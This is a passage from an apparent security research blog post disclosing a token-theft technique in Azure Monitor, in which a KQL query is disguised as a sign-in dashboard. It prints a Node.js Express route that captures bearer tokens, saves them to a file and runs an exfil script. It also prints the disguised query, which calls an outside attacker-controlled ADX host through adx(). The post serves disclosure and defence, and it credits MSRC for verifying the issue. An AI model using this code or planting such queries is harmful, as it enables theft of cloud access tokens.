string">'{"db":"hublaws","csl":"SigninLogs\r\n| take 10","properties":{"Options":{"servertimeout":"00:04:00","queryconsistency":"strongconsistency","query_language":"csl","request_readonly":false,"request_readonly_hardline":false}}}'</code> <code class="bash plain">\</code></div><div class="line number9 index8 alt2"><code class="bash plain">--compressed</code></div></div></td></tr></tbody></table></div></div></div>
+
+
+<p><strong>Node.JS Express MITM route</strong></p>
+
+
+<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_852293" class="syntaxhighlighter  jscript"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="jscript plain">app.use(</code><code class="jscript string">'/*'</code><code class="jscript plain">, </code><code class="jscript keyword">async</code> <code class="jscript plain">(req,res) =&gt; {</code></div><div class="line number2 index1 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">console.log(decode(req.headers.authorization.split(</code><code class="jscript string">'Bearer '</code><code class="jscript plain">)[1],{complete:</code><code class="jscript keyword">true</code><code class="jscript plain">}))</code></div><div class="line number3 index2 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">console.log(req.body,req.method,req.headers)</code></div><div class="line number4 index3 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">require(</code><code class="jscript string">'fs'</code><code class="jscript plain">).writeFileSync(</code><code class="jscript string">'tkn.txt'</code><code class="jscript plain">,req.headers.authorization.split(</code><code class="jscript string">'Bearer '</code><code class="jscript plain">)[1])</code></div><div class="line number5 index4 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript keyword">delete</code> <code class="jscript plain">req.headers.host</code></div><div class="line number6 index5 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</div><div class="line number7 index6 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript keyword">try</code> <code class="jscript plain">{</code></div><div class="line number8 index7 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript keyword">var</code> <code class="jscript plain">{data, headers} = </code><code class="jscript keyword">await</code> <code class="jscript plain">axios({</code></div><div class="line number9 index8 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">method:</code><code class="jscript string">"post"</code><code class="jscript plain">,</code></div><div class="line number10 index9 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">url:</code><code class="jscript string">"<a href="https://help.kusto.windows.net/v1/rest/mgmt">https://help.kusto.windows.net/v1/rest/mgmt</a>"</code><code class="jscript plain">,</code></div><div class="line number11 index10 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">headers:req.headers,</code></div><div class="line number12 index11 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">data: req.body,</code></div><div class="line number13 index12 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">})</code></div><div class="line number14 index13 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">console.log(headers,inspect(data,</code><code class="jscript keyword">false</code><code class="jscript plain">,8))</code></div><div class="line number15 index14 alt2"><code class="jscript plain">ds.push(data)</code></div><div class="line number16 index15 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">/* Object.keys(headers).forEach((headerName) =&gt; {</code></div><div class="line number17 index16 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">res.setHeader(headerName, headers[headerName])</code></div><div class="line number18 index17 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">}) */</code></div><div class="line number19 index18 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</div><div class="line number20 index19 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript comments">// run then bash (you can run it also outside node)</code></div><div class="line number21 index20 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript keyword">var</code> <code class="jscript plain">exfil =</code><code class="jscript keyword">await</code> <code class="jscript plain">runCurl(</code><code class="jscript string">'bash exfil.sh'</code><code class="jscript plain">)</code></div><div class="line number22 index21 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">console.log(exfil)</code></div><div class="line number23 index22 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">require(</code><code class="jscript string">'fs'</code><code class="jscript plain">).writeFileSync(</code><code class="jscript string">'exfil.json'</code><code class="jscript plain">,JSON.stringify(exfil))</code></div><div class="line number24 index23 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</div><div class="line number25 index24 alt2"><code class="jscript keyword">return</code> <code class="jscript plain">res.send(data)</code></div><div class="line number26 index25 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">} </code><code class="jscript keyword">catch</code> <code class="jscript plain">(error) {</code></div><div class="line number27 index26 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">console.log(</code><code class="jscript string">'sending'</code><code class="jscript plain">,ds)</code></div><div class="line number28 index27 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">res.send(ds[0])</code></div><div class="line number29 index28 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">}</code></div><div class="line number30 index29 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</div><div class="line number31 index30 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</div><div class="line number32 index31 alt1"><code class="jscript plain">})</code></div></div></td></tr></tbody></table></div></div></div>
+
+
+<p id="kql"><strong>Example query with the adx() call</strong></p>
+
+
+<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_6540" class="syntaxhighlighter  sql"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="sql plain">let data = SigninLogs</code></div><div class="line number2 index1 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| extend AppDisplayName = iff(AppDisplayName == </code><code class="sql string">''</code><code class="sql plain">, </code><code class="sql string">'Unknown'</code><code class="sql plain">, AppDisplayName)</code></div><div class="line number3 index2 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| </code><code class="sql keyword">where</code> <code class="sql plain">AppDisplayName </code><code class="sql color1">in</code> <code class="sql plain">(</code><code class="sql string">'*'</code><code class="sql plain">) </code><code class="sql color1">or</code> <code class="sql string">'*'</code> <code class="sql color1">in</code> <code class="sql plain">(</code><code class="sql string">'*'</code><code class="sql plain">)</code></div><div class="line number4 index3 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| </code><code class="sql keyword">where</code> <code class="sql plain">UserDisplayName </code><code class="sql color1">in</code> <code class="sql plain">(</code><code class="sql string">'*'</code><code class="sql plain">) </code><code class="sql color1">or</code> <code class="sql string">'*'</code> <code class="sql color1">in</code> <code class="sql plain">(</code><code class="sql string">'*'</code><code class="sql plain">)</code></div><div class="line number5 index4 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| extend Country = iff(LocationDetails.countryOrRegion == </code><code class="sql string">''</code><code class="sql plain">, </code><code class="sql string">'Unknown country'</code><code class="sql plain">, tostring(LocationDetails.countryOrRegion))</code></div><div class="line number6 index5 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| extend City = iff(LocationDetails.city == </code><code class="sql string">''</code><code class="sql plain">, </code><code class="sql string">'Unknown city'</code><code class="sql plain">, tostring(LocationDetails.city))</code></div><div class="line number7 index6 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| extend errorCode = Status.errorCode</code></div><div class="line number8 index7 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| extend SigninStatus = </code><code class="sql color2">case</code><code class="sql plain">(errorCode == 0, </code><code class="sql string">"Success"</code><code class="sql plain">, errorCode == 50058, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 50140, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 51006, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 50059, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 65001, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 52004, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 50055, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 50144, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 50072, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 50074, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 16000, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 16001, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 16003, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 50127, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 50125, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 50129, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 50143, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 81010, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 81014, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, errorCode == 81012, </code><code class="sql string">"Pending user action"</code><code class="sql plain">, </code><code class="sql string">"Failure"</code><code class="sql plain">)</code></div><div class="line number9 index8 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| </code><code class="sql keyword">where</code> <code class="sql plain">SigninStatus == </code><code class="sql string">'*'</code> <code class="sql color1">or</code> <code class="sql string">'*'</code> <code class="sql plain">== </code><code class="sql string">'*'</code> <code class="sql color1">or</code> <code class="sql string">'*'</code> <code class="sql plain">== </code><code class="sql string">'All Sign-ins'</code><code class="sql plain">;</code></div><div class="line number10 index9 alt1"><code class="sql plain">let moreLogs = adx(</code><code class="sql string">'<a href="https://ds.dewi.red:8443/Samples">https://ds.dewi.red:8443/Samples</a>'</code><code class="sql plain">).StormEvents | take 1;</code></div><div class="line number11 index10 alt2"><code class="sql plain">let countryData = data</code></div><div class="line number12 index11 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| summarize</code></div><div class="line number13 index12 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">TotalCount = </code><code class="sql color2">count</code><code class="sql plain">(),</code></div><div class="line number14 index13 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">SuccessCount = countif(SigninStatus == </code><code class="sql string">"Success"</code><code class="sql plain">),</code></div><div class="line number15 index14 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">FailureCount = countif(SigninStatus == </code><code class="sql string">"Failure"</code><code class="sql plain">),</code></div><div class="line number16 index15 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">InterruptCount = countif(SigninStatus == </code><code class="sql string">"Pending user action"</code><code class="sql plain">)</code></div><div class="line number17 index16 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql keyword">by</code> <code class="sql plain">Country</code></div><div class="line number18 index17 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| </code><code class="sql color1">join</code> <code class="sql plain">kind=</code><code class="sql keyword">inner</code></div><div class="line number19 index18 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">(</code></div><div class="line number20 index19 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">data</code></div><div class="line number21 index20 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| make-series Trend = </code><code class="sql color2">count</code><code class="sql plain">() </code><code class="sql keyword">default</code> <code class="sql plain">= 0 </code><code class="sql keyword">on</code> <code class="sql plain">TimeGenerated </code><code class="sql color1">in</code> <code class="sql plain">range(ago(14d), now(), 6h) </code><code class="sql keyword">by</code> <code class="sql plain">Country</code></div><div class="line number22 index21 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| project-away TimeGenerated</code></div><div class="line number23 index22 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">)</code></div><div class="line number24 index23 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql keyword">on</code> <code class="sql plain">Country</code></div><div class="line number25 index24 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| project Country, TotalCount, SuccessCount, FailureCount, InterruptCount, Trend</code></div><div class="line number26 index25 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| </code><code class="sql keyword">order</code> <code class="sql keyword">by</code> <code class="sql plain">TotalCount </code><code class="sql keyword">desc</code><code class="sql plain">, Country </code><code class="sql keyword">asc</code><code class="sql plain">;</code></div><div class="line number27 index26 alt2"><code class="sql plain">data</code></div><div class="line number28 index27 alt1"><code class="sql plain">| summarize</code></div><div class="line number29 index28 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">TotalCount = </code><code class="sql color2">count</code><code class="sql plain">(),</code></div><div class="line number30 index29 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">SuccessCount = countif(SigninStatus == </code><code class="sql string">"Success"</code><code class="sql plain">),</code></div><div class="line number31 index30 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">FailureCount = countif(SigninStatus == </code><code class="sql string">"Failure"</code><code class="sql plain">),</code></div><div class="line number32 index31 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">InterruptCount = countif(SigninStatus == </code><code class="sql string">"Pending user action"</code><code class="sql plain">)</code></div><div class="line number33 index32 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql keyword">by</code> <code class="sql plain">Country, City</code></div><div class="line number34 index33 alt1"><code class="sql plain">| </code><code class="sql color1">join</code> <code class="sql plain">kind=</code><code class="sql keyword">inner</code></div><div class="line number35 index34 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">(</code></div><div class="line number36 index35 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">data&nbsp;&nbsp;&nbsp; </code></div><div class="line number37 index36 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| make-series Trend = </code><code class="sql color2">count</code><code class="sql plain">() </code><code class="sql keyword">default</code> <code class="sql plain">= 0 </code><code class="sql keyword">on</code> <code class="sql plain">TimeGenerated </code><code class="sql color1">in</code> <code class="sql plain">range(ago(14d), now(), 6h) </code><code class="sql keyword">by</code> <code class="sql plain">Country, City</code></div><div class="line number38 index37 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| project-away TimeGenerated</code></div><div class="line number39 index38 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">)</code></div><div class="line number40 index39 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql keyword">on</code> <code class="sql plain">Country, City</code></div><div class="line number41 index40 alt2"><code class="sql plain">| </code><code class="sql keyword">order</code> <code class="sql keyword">by</code> <code class="sql plain">TotalCount </code><code class="sql keyword">desc</code><code class="sql plain">, Country </code><code class="sql keyword">asc</code></div><div class="line number42 index41 alt1"><code class="sql plain">| project Country, City, TotalCount, SuccessCount, FailureCount, InterruptCount, Trend</code></div><div class="line number43 index42 alt2"><code class="sql plain">| </code><code class="sql color1">join</code> <code class="sql plain">kind=</code><code class="sql keyword">inner</code></div><div class="line number44 index43 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">(</code></div><div class="line number45 index44 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">countryData</code></div><div class="line number46 index45 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">)</code></div><div class="line number47 index46 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql keyword">on</code> <code class="sql plain">Country</code></div><div class="line number48 index47 alt1"><code class="sql plain">| project</code></div><div class="line number49 index48 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">Id = City,</code></div><div class="line number50 index49 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql keyword">Name</code> <code class="sql plain">= City,</code></div><div class="line number51 index50 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">Type = </code><code class="sql string">'City'</code><code class="sql plain">,</code></div><div class="line number52 index51 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">[</code><code class="sql string">'Sign-in Count'</code><code class="sql plain">] = TotalCount,</code></div><div class="line number53 index52 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">Trend,</code></div><div class="line number54 index53 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">[</code><code class="sql string">'Failure Count'</code><code class="sql plain">] = FailureCount,</code></div><div class="line number55 index54 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">[</code><code class="sql string">'Interrupt Count'</code><code class="sql plain">] = InterruptCount,</code></div><div class="line number56 index55 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">[</code><code class="sql string">'Success Rate'</code><code class="sql plain">] = 1.0 * SuccessCount / TotalCount,</code></div><div class="line number57 index56 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">ParentId = Country</code></div><div class="line number58 index57 alt1"><code class="sql plain">| </code><code class="sql keyword">union</code> <code class="sql plain">(countryData</code></div><div class="line number59 index58 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">| project</code></div><div class="line number60 index59 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">Id = Country,</code></div><div class="line number61 index60 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql keyword">Name</code> <code class="sql plain">= Country,</code></div><div class="line number62 index61 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">Type = </code><code class="sql string">'Country'</code><code class="sql plain">,</code></div><div class="line number63 index62 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">[</code><code class="sql string">'Sign-in Count'</code><code class="sql plain">] = TotalCount,</code></div><div class="line number64 index63 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">Trend,</code></div><div class="line number65 index64 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">[</code><code class="sql string">'Failure Count'</code><code class="sql plain">] = FailureCount,</code></div><div class="line number66 index65 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">[</code><code class="sql string">'Interrupt Count'</code><code class="sql plain">] = InterruptCount,</code></div><div class="line number67 index66 alt2"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">[</code><code class="sql string">'Success Rate'</code><code class="sql plain">] = 1.0 * SuccessCount / TotalCount,</code></div><div class="line number68 index67 alt1"><code class="sql spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="sql plain">ParentId = </code><code class="sql string">'root'</code><code class="sql plain">)</code></div><div class="line number69 index68 alt2"><code class="sql plain">| </code><code class="sql keyword">order</code> <code class="sql keyword">by</code> <code class="sql plain">[</code><code class="sql string">'Sign-in Count'</code><code class="sql plain">] </code><code class="sql keyword">desc</code><code class="sql plain">, </code><code class="sql keyword">Name</code> <code class="sql keyword">asc</code></div></div></td></tr></tbody></table></div></div></div>
+
+
+<h2 class="wp-block-heading">Evaluation of the attack</h2>
+
+
+
+<p>As this is by design, it should not be considered as a severe attack type. There<br>are mitigating factors, such as (at least in my PoC) that the attacker needs to<br>know the Log Analytics Workspace resourceID, before the attack can be made<br><strong>complete </strong>– That being said, I would still be careful about pasting random queries<br>into workspaces and inspect them for operators, that allow external sources of<br>data. Also it is worth noting, that even without ResourceID, I get valid access token, as soon as the victim runs the query</p>
+
+
+
+<h2 class="wp-block-heading">Additional attack paths</h2>
+
+
+
+<p>I got some great ideas from <a href="https://twitter.com/DrAzureAD">Dr. Nestori Syynimaa</a> and plan to look for additional avenues, since this is new type of attack vector in Azure.</p>
+
+
+
+<ol class="wp-block-list"><li>Can you run it as scheduled query, to get access tokens with system context  (Based on quick tests, this is prevented to ensure system access tokens are not leaked to untrusted ADX workspaces)</li><li>How much you can do enumaration from ADE API <code>https://ade.loganalytics.io/${ws}/v2/rest/query"</code></li></ol>
+
+
+
+<p><strong>End of document</strong><br>I’d like to thank MSRC for verifying my PoC and the great support they provide<br>protecting the ecosystem (having a process to verify something is by-design before publishing the data)</p>
+<div id="jp-post-flair" class="sharedaddy sd-like-enabled sd-sharing-enabled"><div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Jaa tämä:</h3><div class="sd-content"><ul data-sharing-events-added="true"><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-6481" class="share-twitter sd-button share-icon" href="https://securecloud.blog/2022/04/27/azure-monitor-malicious-kql-query/?share=twitter&amp;nb=1" target="_blank" title="Jaa Twitterissä"><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-6481" class="share-linkedin sd-button share-icon" href="https://securecloud.blog/2022/04/27/azure-monitor-malicious-kql-query/?share=linkedin&amp;nb=1" target="_blank" title="Jaa LinkedIn:ssä"><span>LinkedIn</span></a></li><li class="share-end"></li></ul></div></div></div><div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded" id="like-post-wrapper-146690742-6481-666d840d75097" 